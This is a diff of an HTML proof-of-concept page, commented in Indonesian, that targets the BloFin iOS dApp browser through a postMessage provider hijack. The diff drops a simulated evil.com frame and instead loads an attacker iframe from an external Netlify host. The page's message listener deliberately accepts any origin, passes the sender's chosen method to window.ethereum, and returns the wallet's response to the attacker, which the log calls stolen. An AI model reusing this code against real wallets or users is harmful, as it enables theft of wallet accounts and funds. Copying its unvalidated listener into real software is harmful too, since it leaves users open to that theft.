@@ -3,53 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BloFin iOS Real PoC: window.ethereum Hijack</title>
+    <title>Real Vulnerable dApp - postMessage Provider Hijack</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, monospace; background: #0d1117; color: #58a6ff; padding: 15px; margin: 0; }
         .card { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; margin-bottom: 12px; }
-        iframe { width: 100%; height: 180px; border: 1px solid #30363d; background: #000; border-radius: 4px; }
-        #log { background: #010409; color: #7ee787; padding: 12px; border: 1px solid #30363d; border-radius: 6px; font-size: 11px; white-space: pre-wrap; max-height: 200px; overflow-y: auto; }
+        iframe { width: 100%; height: 150px; border: 1px solid #30363d; background: #000; border-radius: 4px; }
+        #log { background: #010409; color: #7ee787; padding: 12px; border: 1px solid #30363d; border-radius: 6px; font-size: 11px; white-space: pre-wrap; max-height: 250px; overflow-y: auto; }
         h3 { margin-top: 0; color: #f0f6fc; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <h3>[BloFin iOS PoC] postMessage & Provider Hijack</h3>
-    <p style="font-size: 12px; color: #8b949e;">Menguji penantian asynchronous injection `window.ethereum` di BloFin dApp browser.</p>
+    <h3>[Real Exploit Target] dApp Bridge Vulnerability</h3>
+    <p style="font-size: 12px; color: #8b949e;">Halaman dApp ini memuat iframe dari domain penyerang eksternal untuk menguji eksploitasi nyata.</p>
 
-    <!-- Status Injeksi Provider -->
+    <!-- Memuat iframe penyerang dari domain Netlify Anda -->
     <div class="card">
-        <h3>Provider Injection Status</h3>
-        <p id="providerStatus" style="color: #ff7b72; font-size: 12px; font-weight: bold;">Waiting for window.ethereum injection...</p>
+        <h3>External Attacker Iframe (imaginative-frangollo-ae57de.netlify.app)</h3>
+        <iframe src="https://imaginative-frangollo-ae57de.netlify.app/evil.html"></iframe>
     </div>
 
-    <!-- Simulasi Attacker Frame (evil.com) -->
-    <div class="card">
-        <h3>Attacker Context (evil.com)</h3>
-        <iframe id="attackerFrame" srcdoc='
-            <!DOCTYPE html>
-            <html>
-            <head><title>Attacker</title></head>
-            <body style="background:#1f1313; color:#ff7b72; font-family:monospace; font-size:11px; padding:10px;">
-                <b>Malicious Frame Active</b>
-                <p id="st">Triggering postMessage in 2 seconds...</p>
-                <script>
-                    setTimeout(() => {
-                        window.parent.postMessage({
-                            action: "EXECUTE_WEB3_CALL",
-                            method: "eth_requestAccounts",
-                            params: []
-                        }, "*");
-                        document.getElementById("st").innerText = "Malicious payload sent!";
-                    }, 2000);
-                </script>
-            </body>
-            </html>
-        '></iframe>
-    </div>
-
-    <h3>Execution Log:</h3>
-    <div id="log">[*] Initializing monitor...\n</div>
+    <h3>Vulnerable dApp Execution Log:</h3>
+    <div id="log">[*] dApp initialized and waiting for external postMessage...\n</div>
 
     <script>
         const logBox = document.getElementById('log');
@@ -59,13 +34,10 @@
             logBox.scrollTop = logBox.scrollHeight;
         }
 
-        // Fungsi helper untuk menunggu window.ethereum di-inject oleh browser mobile secara asinkron
+        // Fungsi helper untuk mendeteksi window.ethereum di BloFin secara asinkron
         function getEthereumProvider() {
             return new Promise((resolve) => {
-                if (window.ethereum) {
-                    return resolve(window.ethereum);
-                }
-                
+                if (window.ethereum) return resolve(window.ethereum);
                 let checks = 0;
                 const interval = setInterval(() => {
                     checks++;
@@ -73,7 +45,7 @@
                         clearInterval(interval);
                         return resolve(window.ethereum);
                     }
-                    if (checks > 20) { // Coba selama 2 detik max
+                    if (checks > 20) {
                         clearInterval(interval);
                         return resolve(null);
                     }
@@ -81,51 +53,39 @@
             });
         }
 
-        // Cek ketersediaan saat halaman dimuat
-        window.addEventListener('DOMContentLoaded', async () => {
-            const eth = await getEthereumProvider();
-            const statusEl = document.getElementById('providerStatus');
-            if (eth) {
-                statusEl.innerText = "SUCCESS: window.ethereum detected!";
-                statusEl.style.color = "#7ee787";
-                appendLog("[+] window.ethereum is successfully available.");
-            } else {
-                statusEl.innerText = "FAILED: window.ethereum not injected.";
-                appendLog("[-] window.ethereum timed out. Pastikan dibuka di dalam dApp browser aktif.");
-            }
-        });
-
-        // Listener postMessage rentan tanpa validasi origin
+        // KERENTANAN UTAMA: Menerima pesan postMessage tanpa validasi event.origin yang aman
         window.addEventListener('message', async (event) => {
-            appendLog(`[+] Intercepted postMessage from origin: ${event.origin}`);
-            appendLog(`[+] Payload: ${JSON.stringify(event.data)}`);
+            appendLog(`[+] Menerima postMessage dari Origin: ${event.origin}`);
+            appendLog(`[+] Data Payload: ${JSON.stringify(event.data)}`);
 
             const data = event.data;
             if (data && data.action === "EXECUTE_WEB3_CALL") {
-                appendLog("[!] Processing unvalidated request from cross-origin...");
+                appendLog("[!] PERINGATAN: Tidak ada validasi origin! Memproses eksekusi ke provider...");
 
                 const eth = await getEthereumProvider();
                 if (!eth) {
-                    appendLog("[-] Error: window.ethereum is missing at execution time.");
+                    appendLog("[-] Error: window.ethereum tidak ditemukan.");
                     event.source.postMessage({ status: "ERROR", message: "Provider missing" }, event.origin);
                     return;
                 }
 
                 try {
-                    appendLog(`[*] Requesting method [${data.method}] to BloFin provider...`);
+                    appendLog(`[*] Memanggil method [${data.method}] ke BloFin wallet...`);
                     const res = await eth.request({
                         method: data.method,
                         params: data.params || []
                     });
 
-                    appendLog(`[SUCCESS] Response from wallet: ${JSON.stringify(res)}`);
+                    appendLog(`[SUKSES] Respons wallet berhasil dicuri: ${JSON.stringify(res)}`);
+                    
+                    // Mengirimkan balik hasil sensitif ke origin penyerang
                     event.source.postMessage({
                         status: "SUCCESS",
                         result: res
                     }, event.origin);
 
                 } catch (err) {
-                    appendLog(`[-] Wallet rejected or error: ${err.message}`);
+                    appendLog(`[-] Wallet menolak / Error: ${err.message}`);
                     event.source.postMessage({
                         status: "ERROR",
                         message: err.message
